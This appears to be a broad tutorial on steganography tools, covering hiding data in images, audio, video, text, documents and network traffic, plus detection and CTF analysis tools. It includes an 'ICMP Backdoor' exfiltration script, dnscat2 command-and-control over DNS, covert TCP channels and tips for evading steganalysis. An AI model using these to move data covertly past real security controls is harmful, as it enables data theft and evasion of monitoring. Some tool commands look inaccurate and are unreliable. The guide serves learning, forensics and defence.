# **Steganography Tools: Complete Guide**

## **What is Steganography?**

**Steganography** = Hiding messages within other files (images, audio, video, text) so that only the sender and recipient know about the hidden data.

**Steganography vs Cryptography:**
- **Cryptography**: Makes message unreadable (obvious encryption)
- **Steganography**: Hides that message even exists (covert)

**Analogy**: Writing with invisible ink vs writing in code.

---

## **Categories of Steganography Tools**

### **1. Image Steganography** (Most Common)
### **2. Audio Steganography**
### **3. Video Steganography**
### **4. Text Steganography**
### **5. Network/Protocol Steganography**
### **6. File/Document Steganography**

---

## **Essential Image Steganography Tools**

### **üîπ 1. OpenStego (Cross-Platform, Beginner-Friendly)**
**Best for**: Beginners, basic hiding/extraction
**Features**:
- Hide data in PNG/BMP images
- Watermarking capability
- Password protection
- Free & open source

**Usage**:
```bash
# Command line
java -jar openstego.jar embed -mf secret.txt -cf cover.jpg -sf output.png -p password123

# Extract
java -jar openstego.jar extract -sf stego.png -xf extracted.txt -p password123
```

### **üîπ 2. Steghide (Linux/Windows, CLI)**
**Best for**: Command-line enthusiasts
**Supported**: JPEG, BMP, WAV, AU files
**Installation**:
```bash
# Ubuntu/Debian
sudo apt install steghide

# Windows: Download from sourceforge
```

**Basic Commands**:
```bash
# Hide file in image
steghide embed -cf cover.jpg -ef secret.txt -sf output.jpg -p "password"

# Extract hidden data
steghide extract -sf output.jpg -p "password"

# Get info about file
steghide info stego.jpg
```

**Advanced Usage**:
```bash
# Maximum compression before embedding
steghide embed -cf image.jpg -ef secret.txt -z 9 -e rijndael-256

# Specify encryption algorithm
steghide embed -cf cover.jpg -ef secret.txt -e blowfish

# Embed without compression
steghide embed -cf image.jpg -ef secret.txt -Z
```

### **üîπ 3. LSB-Steganography (Python-based)**
**Best for**: Learning/understanding LSB method
**Python Implementation**:
```python
from PIL import Image
import numpy as np

def encode_image(image_path, secret_text, output_path):
    img = Image.open(image_path)
    encoded = img.copy()
    width, height = img.size
    index = 0
    
    # Convert text to binary
    binary_secret = ''.join(format(ord(i), '08b') for i in secret_text) + '1111111111111110'  # EOF marker
    
    for y in range(height):
        for x in range(width):
            if index < len(binary_secret):
                pixel = list(img.getpixel((x, y)))
                for n in range(3):  # RGB channels
                    if index < len(binary_secret):
                        pixel[n] = pixel[n] & ~1 | int(binary_secret[index])
                        index += 1
                encoded.putpixel((x, y), tuple(pixel))
            else:
                break
    encoded.save(output_path)

def decode_image(image_path):
    img = Image.open(image_path)
    binary_data = ""
    
    for y in range(img.height):
        for x in range(img.width):
            pixel = img.getpixel((x, y))
            for n in range(3):
                binary_data += str(pixel[n] & 1)
    
    # Find EOF marker and extract message
    eof = binary_data.find('1111111111111110')
    if eof != -1:
        binary_data = binary_data[:eof]
    
    # Convert binary to text
    chars = [binary_data[i:i+8] for i in range(0, len(binary_data), 8)]
    return ''.join(chr(int(char, 2)) for char in chars)

# Usage
encode_image("cover.png", "Top secret message", "stego.png")
message = decode_image("stego.png")
```

### **üîπ 4. GnuPG + Steghide (Enhanced Security)**
```bash
# First encrypt with GPG, then hide
gpg --symmetric --cipher-algo AES256 secret.txt
# Creates secret.txt.gpg

steghide embed -cf image.jpg -ef secret.txt.gpg -sf output.jpg
```

### **üîπ 5. StegOnline (Web-based)**
**URL**: https://stegonline.georgeom.net/
**Best for**: Quick browser-based operations
**Features**:
- Browser-based (no install)
- Multiple algorithms
- Visual representation of LSB
- Drag-and-drop interface

---

## **Audio Steganography Tools**

### **üîπ 1. DeepSound (Windows)**
**Best for**: Hiding files in audio (WAV, FLAC)
**Features**:
- Hide files in audio tracks
- Encryption support (AES-256)
- Carrier file analysis
- GUI interface

**Usage**:
```bash
# Command line options
DeepSound.exe /hide /sound:track.wav /files:secret.zip /output:output.wav /password:secret
```

### **üîπ 2. Coagula (Visual Sound Steganography)**
**Best for**: Converting images to sound and back
**Unique feature**: Creates audio files from images that can be visually decoded

### **üîπ 3. Sonic Visualiser**
**Best for**: Analyzing audio for hidden data
**Features**:
- Spectrogram view
- Layer analysis
- Plugin support

---

## **Video Steganography Tools**

### **üîπ 1. OpenPuff (Windows)**
**Professional-grade features**:
- Hides in video, audio, images
- 256-bit encryption
- Carrier chains (spread across multiple files)
- Deniable encryption (multiple hidden layers)

**Usage**:
```powershell
# Command line
OpenPuff.exe -bitprint -carrier video.mp4 -data secret.rar -password "complexpass"
```

### **üîπ 2. OmniHide PRO**
**Best for**: Corporate/advanced users
**Features**:
- Multiple algorithms
- Compression before hiding
- Support for AVI, MP4, MOV
- Batch processing

### **üîπ 3. FFmpeg + Custom Scripts**
```bash
# Extract frames, hide in images, recompile
ffmpeg -i video.mp4 frames/frame%04d.png

# Use any image stego tool on frames
for f in frames/*.png; do
    steghide embed -cf "$f" -ef secret.txt -p password -sf "modified_$f"
done

# Recompile video
ffmpeg -i modified_frames/frame%04d.png -c:v libx264 output.mp4
```

---

## **Text Steganography Tools**

### **üîπ 1. Snow (Whitespace Steganography)**
**Concept**: Hides data in whitespace at end of lines
**Installation**:
```bash
# Linux
sudo apt-get install snow

# Or compile from source
gcc -o snow snow.c
```

**Usage**:
```bash
# Hide message in text file
snow -C -m "secret" -p "password" input.txt output.txt

# Extract
snow -C -p "password" stego.txt
```

**Example**:
```
Normal text:
This is a normal sentence.

With hidden data (looks identical but has trailing spaces/tabs):
This is a normal sentence.    
```

### **üîπ 2. SpamMimic**
**URL**: http://www.spammimic.com/
**Converts**: Text ‚Üí Spam-like message ‚Üí Text
**Example**:
```
Secret: "Meet me at 5pm"
Becomes spam-looking email about mortgage rates
```

### **üîπ 3. TextHide (Zero-Width Characters)**
**Uses**: Unicode zero-width characters to hide data
```javascript
// JavaScript implementation
function hideText(cover, secret) {
    const zeroWidth = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
    let binary = secret.split('').map(char => 
        char.charCodeAt(0).toString(2).padStart(8, '0')).join('');
    
    let stego = '';
    let bitIndex = 0;
    
    for(let char of cover) {
        stego += char;
        if(bitIndex < binary.length) {
            stego += zeroWidth[parseInt(binary[bitIndex] + binary[bitIndex+1], 2)];
            bitIndex += 2;
        }
    }
    return stego;
}
```

---

## **Document Steganography Tools**

### **üîπ 1. wbStego (Windows/Linux)**
**Best for**: PDF, BMP, HTML, XML, Text files
**Features**:
- Hides in PDF with multiple methods
- Password protection
- Checksum verification

```bash
wbstego_cli embed -c cover.pdf -d secret.txt -o stego.pdf -p password
```

### **üîπ 2. OpenOffice/LibreOffice Metadata**
**Simple method**: Hide in document properties
```bash
# Using exiftool
exiftool -Comment="Hidden message" document.pdf

# Extract
exiftool document.pdf | grep Comment
```

### **üîπ 3. Office Document Inspector Remover**
**Tools to hide**: VBA macros, custom XML, document properties
```powershell
# PowerShell to hide in Word metadata
$word = New-Object -ComObject Word.Application
$doc = $word.Documents.Open("document.docx")
$doc.BuiltInDocumentProperties("Comments").Value = "Hidden text here"
$doc.Save()
$word.Quit()
```

---

## **Network/Protocol Steganography Tools**

### **üîπ 1. Covert_TCP (Linux)**
**Hides data in**: TCP/IP headers (sequence numbers, IDs)
```bash
# Compile
gcc -o covert_tcp covert_tcp.c

# Send hidden data
sudo ./covert_tcp -dest 192.168.1.100 -source 192.168.1.50 \
  -source_port 9999 -dest_port 8888 -file secret.txt \
  -server -seq -ack

# Receive
sudo ./covert_tcp -dest 192.168.1.100 -source 192.168.1.50 \
  -source_port 8888 -dest_port 9999 -file received.txt \
  -client -seq -ack
```

### **üîπ 2. ICMP Backdoor**
**Hides in**: ICMP echo request packets
```python
from scapy.all import *
import base64

def icmp_exfil(destination, data):
    # Encode data in ICMP payload
    encoded = base64.b64encode(data.encode())
    packet = IP(dst=destination)/ICMP()/encoded
    send(packet)

def icmp_listen():
    def process_packet(pkt):
        if ICMP in pkt and pkt[ICMP].type == 8:  # Echo request
            payload = pkt[Raw].load
            secret = base64.b64decode(payload).decode()
            print(f"Received: {secret}")
    
    sniff(filter="icmp", prn=process_packet)
```

### **üîπ 3. DNS Tunnel Tools**
**iodine**: Tunnel IPv4 through DNS
```bash
# Server
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client
iodine -f -P password tunnel.domain.com
```

**dnscat2**: Command & control over DNS
```bash
# Server
ruby dnscat2.rb tunnel.domain.com

# Client
./dnscat2 tunnel.domain.com
```

---

## **Multi-Format & Advanced Tools**

### **üîπ 1. Stegsolve (Java-based Analyzer)**
**Best for**: Analyzing stego images
**Features**:
- LSB viewing
- Color plane analysis
- Frame browser for GIFs
- Stereogram solver

**Usage**:
```bash
java -jar stegsolve.jar
# Then open image and use "Analyze" menu
```

### **üîπ 2. zsteg (Detect stego in PNG/BMP)**
```bash
# Install Ruby gem
gem install zsteg

# Check image for hidden data
zsteg image.png
zsteg -a image.png  # All checks
zsteg -E "b1,rgb,lsb,xy" image.png  # Extract specific
```

### **üîπ 3. Stegdetect (Automated Detection)**
```bash
# Detect steganography in JPEGs
stegdetect image.jpg

# With sensitivity adjustment
stegdetect -s 10.0 image.jpg

# Batch scan
stegdetect *.jpg
```

### **üîπ 4. StegoKit (Forensics Toolkit)**
**Includes**:
- StegoHunter: Automated detection
- GFSG: Gradient-based steganalysis
- Statistical tests

### **üîπ 5. SilentEye (Mac/Windows/Linux)**
**Features**:
- Drag-and-drop interface
- Multiple algorithms
- Plugin support
- Encryption (Blowfish, AES)

---

## **Mobile Steganography Apps**

### **Android:**
1. **StegApp** - Image/text steganography
2. **PixelKnot** - From The Guardian Project
3. **StegDroid** - Academic/research tool
4. **MobiStego** - Mobile version of F5 algorithm

### **iOS**:
1. **iSteg** - Simple image steganography
2. **Steganography Master** - Multiple methods
3. **Secret Calculator** - Hidden vault disguised as calculator

---

## **Steganography Detection & Analysis Tools**

### **1. StegExpose (Java)**
```bash
java -jar stegExpose.jar -dir /path/to/images -out results.csv
```

### **2. StegSpy (Windows)**
- Detects multiple stego tools signatures
- Database of known stego patterns

### **3. GHIRO (Web-based Forensics)**
```bash
# Online version or self-hosted
docker run -p 80:80 ghiro/ghiro
```

### **4. Autopsy + Stegdetect Plugin**
- Integrates stego detection into digital forensics workflow

### **5. Aletheia (Python-based)**
```bash
pip install aletheia
aletheia.py spa image.jpg  # SPAM detection for JPEG
aletheia.py jrm image.jpg  # JRM detection
```

---

## **Programming Libraries for Custom Solutions**

### **Python Libraries:**
```python
# 1. stegano
from stegano import lsb
secret = lsb.hide("cover.png", "Hidden message")
secret.save("stego.png")
message = lsb.reveal("stego.png")

# 2. stepic (for JPEG)
import stepic, Image
im = Image.open("cover.jpg")
im2 = stepic.encode(im, "Hidden text")
im2.save("stego.jpg", "JPEG")
stepic.decode(im2)

# 3. OpenStego Python bindings
```

### **JavaScript Libraries:**
```javascript
// steganography.js
const steg = require('steganography');
const fs = require('fs');

// Hide in image
const image = fs.readFileSync('cover.png');
const secret = steg.encode('secret message', image);
fs.writeFileSync('stego.png', secret);

// Reveal
const stegoImage = fs.readFileSync('stego.png');
console.log(steg.decode(stegoImage));
```

### **C/C++ Libraries:**
```cpp
// libstego library
#include <libstego/libstego.h>
stego_status_t status;
uint8_t *stego_data;
size_t stego_len;

status = stego_lsb_encode(cover_data, cover_len, 
                          secret_data, secret_len,
                          &stego_data, &stego_len);
```

---

## **Command-Line Workflows**

### **Complete Steganography Pipeline:**
```bash
#!/bin/bash
# Steganography automation script

# 1. Compress and encrypt secret
tar czf secret.tar.gz secret_folder
openssl enc -aes-256-cbc -salt -in secret.tar.gz -out secret.enc -pass pass:"strongpassword"

# 2. Hide in image
steghide embed -cf cover.jpg -ef secret.enc -sf delivery.jpg -p "hiddenpassword"

# 3. Add decoy (double steganography)
# First layer: password1 with fake message
# Second layer: password2 with real message

# 4. Clean up
shred -u secret.tar.gz secret.enc

# 5. Extract workflow
steghide extract -sf delivery.jpg -p "hiddenpassword" -xf secret.enc
openssl enc -d -aes-256-cbc -in secret.enc -out secret.tar.gz -pass pass:"strongpassword"
tar xzf secret.tar.gz
```

### **Batch Processing Images:**
```bash
# Hide same message in multiple images
for img in *.jpg; do
    steghide embed -cf "$img" -ef message.txt -p password -sf "hidden_$img"
done

# Extract from all
for img in hidden_*.jpg; do
    steghide extract -sf "$img" -p password -xf "extracted_${img%.*}.txt"
done
```

---

## **CTF & Security Challenge Tools**

### **Common CTF Stego Tools:**
```bash
# 1. binwalk (find hidden files)
binwalk stego.jpg
binwalk -e stego.jpg  # Extract automatically

# 2. foremost (carve files)
foremost -i stego.jpg -o output/

# 3. exiftool (metadata)
exiftool stego.jpg | grep -i comment

# 4. strings (find text)
strings stego.jpg | grep -i flag

# 5. xxd (hex view)
xxd stego.jpg | head -50

# 6. pngcheck (PNG analysis)
pngcheck -v stego.png

# 7. jsteg (specifically for JPEG)
jsteg reveal stego.jpg
```

### **Online Stego Solvers:**
- **aperisolve.com** - All-in-one web tool
- **stylesuxx.github.io/steganography** - Online decoder
- **futureboy.us/stegano** - Browser-based tools

---

## **Best Practices & Security Considerations**

### **1. Always Encrypt Before Hiding**
```bash
# BAD: Hide plaintext
steghide embed -cf image.jpg -ef plaintext.txt

# GOOD: Encrypt then hide
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc
steghide embed -cf image.jpg -ef secret.enc
```

### **2. Use Multiple Layers (Plausible Deniability)**
```python
# Layer 1: Innocent-looking message
layer1 = "This is just a shopping list"
# Layer 2: Real secret (encrypted)
layer2 = encrypt("Real secret message")
# Both hidden with different passwords
```

### **3. Choose Proper Cover Files**
**Good covers**: 
- High-resolution images
- Complex backgrounds
- Natural photos (not computer-generated)
- Files from legitimate sources

**Bad covers**: 
- Small images
- Solid colors
- Previously used in stego

### **4. Check Against Steganalysis**
```bash
# Test your stego before sending
stegdetect output.jpg
stegbreak -r rules.ini output.jpg
```

### **5. Operational Security**
```bash
# Clean metadata
exiftool -all= stego.jpg

# Verify no traces
strings stego.jpg | grep -i "steghide|password|secret"

# Use secure deletion
shred -u original_with_secret.jpg
```

---

## **Legal & Ethical Warning**

### **‚ö†Ô∏è Legal Status**
Steganography is **legal** for:
- Personal privacy
- Digital watermarking
- Legitimate security testing
- Research with permission

**Illegal** when used for:
- Hiding illegal content
- Corporate espionage
- Terrorist communication
- Bypassing security controls

### **Detection is Common**
- Many organizations scan for steganography
- Email attachments often analyzed
- Corporate firewalls may block suspicious files
- Law enforcement has advanced detection tools

---

## **Quick Reference Cheat Sheet**

```bash
# IMAGE STEGANOGRAPHY
steghide embed -cf cover.jpg -ef secret.txt -p password
steghide extract -sf stego.jpg -p password
openstego embed -mf secret.txt -cf cover.png -p password
openstego extract -sf stego.png -p password

# ANALYSIS/DETECTION
binwalk image.jpg
strings image.jpg | grep flag
exiftool image.jpg
zsteg image.png
stegsolve.jar  # GUI analysis

# TEXT STEGANOGRAPHY
snow -C -m "secret" -p pass input.txt output.txt
spammimic.com  # Online text stego

# MULTIMEDIA
DeepSound.exe /hide /sound:audio.wav /files:secret.zip
OpenPuff.exe -carrier video.mp4 -data secret.rar

# PROGRAMMATIC
python -c "from stegano import lsb; lsb.hide('img.png','msg')"
```

---

## **The Future of Steganography**

### **Emerging Techniques:**
1. **AI-based steganography** - Neural networks creating optimal hiding
2. **Quantum steganography** - Using quantum properties
3. **Deep fakes as carriers** - Hiding data in AI-generated media
4. **IoT device steganography** - Smart devices as covert channels

### **Defensive Future:**
- **AI detection systems** - Machine learning finding stego
- **Blockchain verification** - Provenance tracking for files
- **Mandatory watermarking** - All media tagged with origin

---

## **Final Recommendations**

### **For Beginners:**
1. Start with **OpenStego** (GUI) or **Steghide** (CLI)
2. Practice with CTF challenges
3. Learn basic detection methods

### **For Professionals:**
1. Use **encryption + steganography**
2. Implement **multiple layers**
3. Regularly **test against detection**
4. Stay updated on **new techniques**

### **For Security Teams:**
1. Implement **steganalysis** on perimeter
2. Monitor for **unusual file sizes/types**
3. Educate users about **stego threats**
4. Keep **detection tools** updated

**Remember**: The best steganography leaves no statistical trace and survives format conversions, resizing, and compression. Always test your hidden data survives intended transmission methods!
